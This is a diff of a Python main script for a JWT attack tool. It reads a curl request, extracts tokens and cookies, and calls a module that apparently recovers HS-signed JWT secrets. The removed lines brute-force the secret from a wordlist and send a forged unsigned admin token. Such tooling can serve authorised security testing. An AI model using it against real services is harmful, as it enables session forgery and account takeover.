@@ -1,71 +1,38 @@
 ## jwt hacking main, tests all JWT hacking activities
 
-from jwtAlgos.bruteForceHS import hs_brute_force
+from jwtAlgos.HS_algos import hs_algos
 from jwtHelper.jwtSplitter import jwt_reader
 from jwtHelper.sendRequest import send_request
 from jwtHelper.interpretCurl import curl_interpreter
-import os
-from dotenv import load_dotenv
+from jwtAlgos.delegateJWTs import jwt_delegater
 import requests
 import sys
 
-load_dotenv()
-brute_force_wordlist = os.getenv("BRUTE-FORCE-LIST-PATH")
-
-with open(brute_force_wordlist, "r", encoding="utf-8") as f:
-    wordlist = [line.strip() for line in f if line.strip()]
 
 
 data = sys.stdin.read()
+print("1")
 
-lines = data.split("\n")
-headers = curl_interpreter.headers_from_curl(lines)
+request_data = curl_interpreter.convert_data(data=data)
 
-
-for header in headers:
-    print(header)
-
-jwts = curl_interpreter.find_jwt(headers)
-
+print("x")
+print(request_data.get("jwts"))
+print(request_data.get("headers"))
+print(request_data.get("cookies"))
 print("---")
-print(jwts)
+print(request_data.get("url"))
+print(request_data.get("method"))
 
-header_dict = curl_interpreter.headers_to_dict(headers=headers)
-cookies_dict = curl_interpreter.extract_cookies(headers=headers)
-print("---")
-print(header_dict)
-
-print(cookies_dict)
-
-quit()
+print("start")
+jwt_secret = jwt_delegater.hs_algo(request_data.get("jwts"), request_data=request_data)
 
 
+print(jwt_secret)
 
+"""
 
+Add module to remove all unused auth. So all JWTs that could be removed while still returning 200 gets removed <-
 
+"""
 
-alg = jwt_reader.get_jwt_alg(jwt)
-testrun = hs_brute_force.brute_force_secret(jwt, wordlist)
-print(testrun)
-
-quit()
-
-path = "example.com/test"
-host = path.split("/")[0]
-
-headers = {
-    "Host": f"{host}",
-    "Authorization": f"Bearer {jwt}"
-}
-
-cookies = {
-    "EXAMPLE_AUTH_COOKIE": f"{jwt}"
-}
-
-
-new_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0."
-
-
-respcode = send_request.send_get_request(host, jwt, headers, cookies)
-
-print(respcode)
+print("Done!")
